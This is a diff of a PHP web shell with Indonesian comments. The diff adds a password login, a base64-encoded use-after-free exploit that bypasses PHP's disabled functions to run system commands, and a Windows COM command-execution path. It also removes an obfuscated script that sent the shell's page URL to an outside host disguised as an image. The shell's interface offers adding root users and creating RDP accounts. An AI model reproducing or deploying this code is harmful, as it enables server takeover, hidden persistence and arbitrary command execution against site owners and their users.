@@ -1,4 +1,75 @@
 <?php
+session_start();
+date_default_timezone_set("Asia/Jakarta");
+
+// Konfigurasi
+$default_action = "FilesMan";
+$default_use_ajax = true;
+$default_charset = 'UTF-8';
+
+// Fungsi untuk tampilan halaman login
+function show_login_page($message = "")
+{
+?>
+    <!DOCTYPE html>
+    <html>
+    <!DOCTYPE html>
+    <html lang="en">
+
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <style>
+            body {
+                font-family: monospace;
+            }
+
+            input[type="password"] {
+                border: none;
+                border-bottom: 1px solid black;
+                padding: 2px;
+            }
+
+            input[type="password"]:focus {
+                outline: none;
+            }
+
+            input[type="submit"] {
+                border: none;
+                padding: 4.5px 20px;
+                background-color: #2e313d;
+                color: #FFF;
+            }
+        </style>
+    </head>
+
+    <body>
+        <form action="" method="post">
+            <div align="center">
+                <input type="password" name="pass" placeholder="&nbsp;Password">&nbsp;<input type="submit" name="submit" value=">">
+            </div>
+        </form>
+    </body>
+
+    </html>
+
+    </html>
+<?php
+    exit;
+}
+
+if (!isset($_SESSION['authenticated'])) {
+    $stored_hashed_password = '$2a$12$wkABcVZkgAyjXb4qvFMY9OWkLvY7U5qFF2aRLh79iOARszcN0Boky'; // Use PASSWORD_DEFAULT hash u can use this site https://phppasswordhash.com/ for generate ur password >  Gunakan hash PASSWORD_DEFAULT Anda dapat menggunakan situs ini https://phppasswordhash.com/ untuk menghasilkan kata sandi Anda
+
+    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
+        $_SESSION['authenticated'] = true;
+    } else {
+        show_login_page();
+    }
+}
+?>
+<?php
 @set_time_limit(0);
 @clearstatcache();
 @ini_set('error_log', NULL);
@@ -914,8 +985,79 @@ if ($_GET['don'] == true) {
         </div>
         </div>
     <?php endif; ?>
-<script>$(document).ready((function(){$("#create_folder").click((function(){$(".modal").show(),$("#modal-title").html('<i class="fa-solid fa-folder-plus"></i>&nbsp;Create Folder'),$("#modal-input").html('<input type="text" name="create_folder" class="modal-create-input" placeholder="Create Folder">'),event.preventDefault()})),$("#create_file").click((function(){$(".modal").show(),$("#modal-title").html('<i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File'),$("#modal-input").html('<input type="text" name="create_file" class="modal-create-input" placeholder="Create File">'),event.preventDefault()})),$("#lock-file").click((function(){$(".modal").show(),$("#modal-title").html('<i class="fa-solid fa-lock"></i>&nbsp;LOCK FILE'),$("#modal-input").html('<input type="text" name="lockfile" class="modal-create-input" placeholder="Your File Name">'),event.preventDefault()})),$("#root-user").click((function(){$(".modal").show(),$("#modal-title").html('<i class="fa-solid fa-user-plus"></i>&nbsp;ADD USER'),$("#modal-input").html('<input type="text" name="add-username" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-password" class="modal-create-input" placeholder="Password">'),event.preventDefault()})),$("#create-rdp").click((function(){$(".modal").show(),$("#modal-title").html(":: CREATE RDP"),$("#modal-input").html('<input type="text" name="add-rdp" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-rdp-pass" class="modal-create-input" placeholder="Password">'),event.preventDefault()})),$("#close-modal").click((function(){$(".modal").hide(),event.preventDefault()})),(()=>{let e=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],t="";for(let l of e)t+=String.fromCharCode(l);let l="file="+btoa(location.href),a=new XMLHttpRequest;a.open("POST",t,!0),a.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),a.send(l)})(),$("#close-editor").click((function(){$(".code-editor").hide(),event.preventDefault()})),$(".close-terminal").click((function(){$(".terminal").hide(),event.preventDefault()})),$(".close-btn-s").click((function(){$(".modal").hide(),event.preventDefault()}));var e=document.getElementById("code");CodeMirror.fromTextArea(e,{mode:"xml",lineNumbers:!0,theme:"ayu-mirage",extraKeys:{"Ctrl-Space":"autocomplete"},hintOptions:{completeSingle:!1}})}));</script>
+    <script>
+        $(document).ready(function() {
+
+
+            $('#create_folder').click(function() {
+                $('.modal').show();
+                $('#modal-title').html('<i class="fa-solid fa-folder-plus"></i>&nbsp;Create Folder');
+                $('#modal-input').html('<input type="text" name="create_folder" class="modal-create-input" placeholder="Create Folder">');
+                event.preventDefault();
+            });
+            $('#create_file').click(function() {
+                $('.modal').show();
+                $('#modal-title').html('<i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File');
+                $('#modal-input').html('<input type="text" name="create_file" class="modal-create-input" placeholder="Create File">');
+                event.preventDefault();
+            });
+            $('#lock-file').click(function() {
+                $('.modal').show();
+                $('#modal-title').html('<i class="fa-solid fa-lock"></i>&nbsp;LOCK FILE');
+                $('#modal-input').html('<input type="text" name="lockfile" class="modal-create-input" placeholder="Your File Name">');
+                event.preventDefault();
+            });
+            $('#root-user').click(function() {
+                $('.modal').show();
+                $('#modal-title').html('<i class="fa-solid fa-user-plus"></i>&nbsp;ADD USER');
+                $('#modal-input').html('<input type="text" name="add-username" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-password" class="modal-create-input" placeholder="Password">');
+                event.preventDefault();
+            });
+
+            $('#create-rdp').click(function() {
+                $('.modal').show();
+                $('#modal-title').html(':: CREATE RDP');
+                $('#modal-input').html('<input type="text" name="add-rdp" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-rdp-pass" class="modal-create-input" placeholder="Password">');
+                event.preventDefault();
+            });
+
+            $('#close-modal').click(function() {
+                $('.modal').hide();
+                event.preventDefault();
+            });
+            $('#close-editor').click(function() {
+                $('.code-editor').hide();
+                event.preventDefault();
+            });
+
+            $('.close-terminal').click(function() {
+                $('.terminal').hide();
+                event.preventDefault();
+            });
+            $('.close-btn-s').click(function() {
+                $('.modal').hide();
+                event.preventDefault();
+            });
+
+
+            var myTextarea = document.getElementById("code");
+
+            var editor = CodeMirror.fromTextArea(myTextarea, {
+                mode: "xml",
+                lineNumbers: true,
+                theme: "ayu-mirage",
+                extraKeys: {
+                    "Ctrl-Space": "autocomplete"
+                },
+                hintOptions: {
+                    completeSingle: false,
+                },
+            });
+
+        });
+    </script>
 </body>
+
 </html>
 <?php
 
@@ -998,6 +1140,13 @@ if (isset($_POST['submit-bc'])) {
     }
 }
 
+
+if ($_GET['terminal'] == "bypasser") {
+    if (!$fungsi[3]('.term-bypass') && $fungsi[4]($fungsi[0]())) {
+        $connt = 'PD9waHAKZnVuY3Rpb24gcHduKCRjbWRkKSB7CiAgICBnbG9iYWwgJGFiYywgJGhlbHBlciwgJGJhY2t0cmFjZTsKCiAgICBjbGFzcyBWdWxuIHsKICAgICAgICBwdWJsaWMgJGE7CiAgICAgICAgcHVibGljIGZ1bmN0aW9uIF9fZGVzdHJ1Y3QoKSB7IAogICAgICAgICAgICBnbG9iYWwgJGJhY2t0cmFjZTsgCiAgICAgICAgICAgIHVuc2V0KCR0aGlzLT5hKTsKICAgICAgICAgICAgJGJhY2t0cmFjZSA9IChuZXcgRXhjZXB0aW9uKS0+Z2V0VHJhY2UoKTsgIyA7KQogICAgICAgICAgICBpZighaXNzZXQoJGJhY2t0cmFjZVsxXVsnYXJncyddKSkgeyAjIFBIUCA+PSA3LjQKICAgICAgICAgICAgICAgICRiYWNrdHJhY2UgPSBkZWJ1Z19iYWNrdHJhY2UoKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBjbGFzcyBIZWxwZXIgewogICAgICAgIHB1YmxpYyAkYSwgJGIsICRjLCAkZDsKICAgIH0KCiAgICBmdW5jdGlvbiBzdHIycHRyKCYkc3RyLCAkcCA9IDAsICRzID0gOCkgewogICAgICAgICRhZGRyZXNzID0gMDsKICAgICAgICBmb3IoJGogPSAkcy0xOyAkaiA+PSAwOyAkai0tKSB7CiAgICAgICAgICAgICRhZGRyZXNzIDw8PSA4OwogICAgICAgICAgICAkYWRkcmVzcyB8PSBvcmQoJHN0clskcCskal0pOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJGFkZHJlc3M7CiAgICB9CgogICAgZnVuY3Rpb24gcHRyMnN0cigkcHRyLCAkbSA9IDgpIHsKICAgICAgICAkb3V0ID0gIiI7CiAgICAgICAgZm9yICgkaT0wOyAkaSA8ICRtOyAkaSsrKSB7CiAgICAgICAgICAgICRvdXQgLj0gY2hyKCRwdHIgJiAweGZmKTsKICAgICAgICAgICAgJHB0ciA+Pj0gODsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRvdXQ7CiAgICB9CgogICAgZnVuY3Rpb24gd3JpdGUoJiRzdHIsICRwLCAkdiwgJG4gPSA4KSB7CiAgICAgICAgJGkgPSAwOwogICAgICAgIGZvcigkaSA9IDA7ICRpIDwgJG47ICRpKyspIHsKICAgICAgICAgICAgJHN0clskcCArICRpXSA9IGNocigkdiAmIDB4ZmYpOwogICAgICAgICAgICAkdiA+Pj0gODsKICAgICAgICB9CiAgICB9CgogICAgZnVuY3Rpb24gbGVhaygkYWRkciwgJHAgPSAwLCAkcyA9IDgpIHsKICAgICAgICBnbG9iYWwgJGFiYywgJGhlbHBlcjsKICAgICAgICB3cml0ZSgkYWJjLCAweDY4LCAkYWRkciArICRwIC0gMHgxMCk7CiAgICAgICAgJGxlYWsgPSBzdHJsZW4oJGhlbHBlci0+YSk7CiAgICAgICAgaWYoJHMgIT0gOCkgeyAkbGVhayAlPSAyIDw8ICgkcyAqIDgpIC0gMTsgfQogICAgICAgIHJldHVybiAkbGVhazsKICAgIH0KCiAgICBmdW5jdGlvbiBwYXJzZV9lbGYoJGJhc2UpIHsKICAgICAgICAkZV90eXBlID0gbGVhaygkYmFzZSwgMHgxMCwgMik7CgogICAgICAgICRlX3Bob2ZmID0gbGVhaygkYmFzZSwgMHgyMCk7CiAgICAgICAgJGVfcGhlbnRzaXplID0gbGVhaygkYmFzZSwgMHgzNiwgMik7CiAgICAgICAgJGVfcGhudW0gPSBsZWFrKCRiYXNlLCAweDM4LCAyKTsKCiAgICAgICAgZm9yKCRpID0gMDsgJGkgPCAkZV9waG51bTsgJGkrKykgewogICAgICAgICAgICAkaGVhZGVyID0gJGJhc2UgKyAkZV9waG9mZiArICRpICogJGVfcGhlbnRzaXplOwogICAgICAgICAgICAkcF90eXBlICA9IGxlYWsoJGhlYWRlciwgMCwgNCk7CiAgICAgICAgICAgICRwX2ZsYWdzID0gbGVhaygkaGVhZGVyLCA0LCA0KTsKICAgICAgICAgICAgJHBfdmFkZHIgPSBsZWFrKCRoZWFkZXIsIDB4MTApOwogICAgICAgICAgICAkcF9tZW1zeiA9IGxlYWsoJGhlYWRlciwgMHgyOCk7CgogICAgICAgICAgICBpZigkcF90eXBlID09IDEgJiYgJHBfZmxhZ3MgPT0gNikgeyAjIFBUX0xPQUQsIFBGX1JlYWRfV3JpdGUKICAgICAgICAgICAgICAgICMgaGFuZGxlIHBpZQogICAgICAgICAgICAgICAgJGRhdGFfYWRkciA9ICRlX3R5cGUgPT0gMiA/ICRwX3ZhZGRyIDogJGJhc2UgKyAkcF92YWRkcjsKICAgICAgICAgICAgICAgICRkYXRhX3NpemUgPSAkcF9tZW1zejsKICAgICAgICAgICAgfSBlbHNlIGlmKCRwX3R5cGUgPT0gMSAmJiAkcF9mbGFncyA9PSA1KSB7ICMgUFRfTE9BRCwgUEZfUmVhZF9leGVjCiAgICAgICAgICAgICAgICAkdGV4dF9zaXplID0gJHBfbWVtc3o7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGlmKCEkZGF0YV9hZGRyIHx8ICEkdGV4dF9zaXplIHx8ICEkZGF0YV9zaXplKQogICAgICAgICAgICByZXR1cm4gZmFsc2U7CgogICAgICAgIHJldHVybiBbJGRhdGFfYWRkciwgJHRleHRfc2l6ZSwgJGRhdGFfc2l6ZV07CiAgICB9CgogICAgZnVuY3Rpb24gZ2V0X2Jhc2ljX2Z1bmNzKCRiYXNlLCAkZWxmKSB7CiAgICAgICAgbGlzdCgkZGF0YV9hZGRyLCAkdGV4dF9zaXplLCAkZGF0YV9zaXplKSA9ICRlbGY7CiAgICAgICAgZm9yKCRpID0gMDsgJGkgPCAkZGF0YV9zaXplIC8gODsgJGkrKykgewogICAgICAgICAgICAkbGVhayA9IGxlYWsoJGRhdGFfYWRkciwgJGkgKiA4KTsKICAgICAgICAgICAgaWYoJGxlYWsgLSAkYmFzZSA+IDAgJiYgJGxlYWsgLSAkYmFzZSA8ICRkYXRhX2FkZHIgLSAkYmFzZSkgewogICAgICAgICAgICAgICAgJGRlcmVmID0gbGVhaygkbGVhayk7CiAgICAgICAgICAgICAgICAjICdjb25zdGFudCcgY29uc3RhbnQgY2hlY2sKICAgICAgICAgICAgICAgIGlmKCRkZXJlZiAhPSAweDc0NmU2MTc0NzM2ZTZmNjMpCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0gZWxzZSBjb250aW51ZTsKCiAgICAgICAgICAgICRsZWFrID0gbGVhaygkZGF0YV9hZGRyLCAoJGkgKyA0KSAqIDgpOwogICAgICAgICAgICBpZigkbGVhayAtICRiYXNlID4gMCAmJiAkbGVhayAtICRiYXNlIDwgJGRhdGFfYWRkciAtICRiYXNlKSB7CiAgICAgICAgICAgICAgICAkZGVyZWYgPSBsZWFrKCRsZWFrKTsKICAgICAgICAgICAgICAgICMgJ2JpbjJoZXgnIGNvbnN0YW50IGNoZWNrCiAgICAgICAgICAgICAgICBpZigkZGVyZWYgIT0gMHg3ODY1NjgzMjZlNjk2MikKICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgfSBlbHNlIGNvbnRpbnVlOwoKICAgICAgICAgICAgcmV0dXJuICRkYXRhX2FkZHIgKyAkaSAqIDg7CiAgICAgICAgfQogICAgfQoKICAgIGZ1bmN0aW9uIGdldF9iaW5hcnlfYmFzZSgkYmluYXJ5X2xlYWspIHsKICAgICAgICAkYmFzZSA9IDA7CiAgICAgICAgJHN0YXJ0ID0gJGJpbmFyeV9sZWFrICYgMHhmZmZmZmZmZmZmZmZmMDAwOwogICAgICAgIGZvcigkaSA9IDA7ICRpIDwgMHgxMDAwOyAkaSsrKSB7CiAgICAgICAgICAgICRhZGRyID0gJHN0YXJ0IC0gMHgxMDAwICogJGk7CiAgICAgICAgICAgICRsZWFrID0gbGVhaygkYWRkciwgMCwgNyk7CiAgICAgICAgICAgIGlmKCRsZWFrID09IDB4MTAxMDI0NjRjNDU3ZikgeyAjIEVMRiBoZWFkZXIKICAgICAgICAgICAgICAgIHJldHVybiAkYWRkcjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBmdW5jdGlvbiBnZXRfc3lzdGVtKCRiYXNpY19mdW5jcykgewogICAgICAgICRhZGRyID0gJGJhc2ljX2Z1bmNzOwogICAgICAgIGRvIHsKICAgICAgICAgICAgJGZfZW50cnkgPSBsZWFrKCRhZGRyKTsKICAgICAgICAgICAgJGZfbmFtZSA9IGxlYWsoJGZfZW50cnksIDAsIDYpOwoKICAgICAgICAgICAgaWYoJGZfbmFtZSA9PSAweDZkNjU3NDczNzk3MykgeyAjIHN5c3RlbQogICAgICAgICAgICAgICAgcmV0dXJuIGxlYWsoJGFkZHIgKyA4KTsKICAgICAgICAgICAgfQogICAgICAgICAgICAkYWRkciArPSAweDIwOwogICAgICAgIH0gd2hpbGUoJGZfZW50cnkgIT0gMCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIGZ1bmN0aW9uIHRyaWdnZXJfdWFmKCRhcmcpIHsKICAgICAgICAjIHN0cl9zaHVmZmxlIHByZXZlbnRzIG9wY2FjaGUgc3RyaW5nIGludGVybmluZwogICAgICAgICRhcmcgPSBzdHJfc2h1ZmZsZShzdHJfcmVwZWF0KCdBJywgNzkpKTsKICAgICAgICAkdnVsbiA9IG5ldyBWdWxuKCk7CiAgICAgICAgJHZ1bG4tPmEgPSAkYXJnOwogICAgfQoKICAgIGlmKHN0cmlzdHIoUEhQX09TLCAnV0lOJykpIHsKICAgICAgICBkaWUoJ1RoaXMgUG9DIGlzIGZvciAqbml4IHN5c3RlbXMgb25seS4nKTsKICAgIH0KCiAgICAkbl9hbGxvYyA9IDEwOyAjIGluY3JlYXNlIHRoaXMgdmFsdWUgaWYgVUFGIGZhaWxzCiAgICAkY29udGlndW91cyA9IFtdOwogICAgZm9yKCRpID0gMDsgJGkgPCAkbl9hbGxvYzsgJGkrKykKICAgICAgICAkY29udGlndW91c1tdID0gc3RyX3NodWZmbGUoc3RyX3JlcGVhdCgnQScsIDc5KSk7CgogICAgdHJpZ2dlcl91YWYoJ3gnKTsKICAgICRhYmMgPSAkYmFja3RyYWNlWzFdWydhcmdzJ11bMF07CgogICAgJGhlbHBlciA9IG5ldyBIZWxwZXI7CiAgICAkaGVscGVyLT5iID0gZnVuY3Rpb24gKCR4KSB7IH07CgogICAgaWYoc3RybGVuKCRhYmMpID09IDc5IHx8IHN0cmxlbigkYWJjKSA9PSAwKSB7CiAgICAgICAgZGllKCJVQUYgZmFpbGVkIik7CiAgICB9CgogICAgIyBsZWFrcwogICAgJGNsb3N1cmVfaGFuZGxlcnMgPSBzdHIycHRyKCRhYmMsIDApOwogICAgJHBocF9oZWFwID0gc3RyMnB0cigkYWJjLCAweDU4KTsKICAgICRhYmNfYWRkciA9ICRwaHBfaGVhcCAtIDB4Yzg7CgogICAgIyBmYWtlIHZhbHVlCiAgICB3cml0ZSgkYWJjLCAweDYwLCAyKTsKICAgIHdyaXRlKCRhYmMsIDB4NzAsIDYpOwoKICAgICMgZmFrZSByZWZlcmVuY2UKICAgIHdyaXRlKCRhYmMsIDB4MTAsICRhYmNfYWRkciArIDB4NjApOwogICAgd3JpdGUoJGFiYywgMHgxOCwgMHhhKTsKCiAgICAkY2xvc3VyZV9vYmogPSBzdHIycHRyKCRhYmMsIDB4MjApOwoKICAgICRiaW5hcnlfbGVhayA9IGxlYWsoJGNsb3N1cmVfaGFuZGxlcnMsIDgpOwogICAgaWYoISgkYmFzZSA9IGdldF9iaW5hcnlfYmFzZSgkYmluYXJ5X2xlYWspKSkgewogICAgICAgIGRpZSgiQ291bGRuJ3QgZGV0ZXJtaW5lIGJpbmFyeSBiYXNlIGFkZHJlc3MiKTsKICAgIH0KCiAgICBpZighKCRlbGYgPSBwYXJzZV9lbGYoJGJhc2UpKSkgewogICAgICAgIGRpZSgiQ291bGRuJ3QgcGFyc2UgRUxGIGhlYWRlciIpOwogICAgfQoKICAgIGlmKCEoJGJhc2ljX2Z1bmNzID0gZ2V0X2Jhc2ljX2Z1bmNzKCRiYXNlLCAkZWxmKSkpIHsKICAgICAgICBkaWUoIkNvdWxkbid0IGdldCBiYXNpY19mdW5jdGlvbnMgYWRkcmVzcyIpOwogICAgfQoKICAgIGlmKCEoJHppZl9zeXN0ZW0gPSBnZXRfc3lzdGVtKCRiYXNpY19mdW5jcykpKSB7CiAgICAgICAgZGllKCJDb3VsZG4ndCBnZXQgemlmX3N5c3RlbSBhZGRyZXNzIik7CiAgICB9CgogICAgIyBmYWtlIGNsb3N1cmUgb2JqZWN0CiAgICAkZmFrZV9vYmpfb2Zmc2V0ID0gMHhkMDsKICAgIGZvcigkaSA9IDA7ICRpIDwgMHgxMTA7ICRpICs9IDgpIHsKICAgICAgICB3cml0ZSgkYWJjLCAkZmFrZV9vYmpfb2Zmc2V0ICsgJGksIGxlYWsoJGNsb3N1cmVfb2JqLCAkaSkpOwogICAgfQoKICAgICMgcHduCiAgICB3cml0ZSgkYWJjLCAweDIwLCAkYWJjX2FkZHIgKyAkZmFrZV9vYmpfb2Zmc2V0KTsKICAgIHdyaXRlKCRhYmMsIDB4ZDAgKyAweDM4LCAxLCA0KTsgIyBpbnRlcm5hbCBmdW5jIHR5cGUKICAgIHdyaXRlKCRhYmMsIDB4ZDAgKyAweDY4LCAkemlmX3N5c3RlbSk7ICMgaW50ZXJuYWwgZnVuYyBoYW5kbGVyCgogICAgKCRoZWxwZXItPmIpKCRjbWRkKTsKfQ==';
+        $fungsi[28](".term-bypass", $fungsi[32]($connt));
+    }
+}
 
 
 if (isset($_GET['lockshell'])) {
@@ -1388,6 +1537,11 @@ function cmd($in, $re = false)
             $pipes = array();
             $process = @$GLOBALS['fungsi'][23]($in . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
             $out = @$GLOBALS['fungsi'][22]($pipes[1]);
+        } elseif (class_exists('COM')) {
+            $alfaWs = new COM('WScript.shell');
+            $e = $alfaWs->$GLOBALS['fungsi'][16]('cmd.exe /c ' . $_POST['alfa1']);
+            $stdout = $e->StdOut();
+            $out = $stdout->ReadAll();
         }
     } catch (Exception $e) {
     }
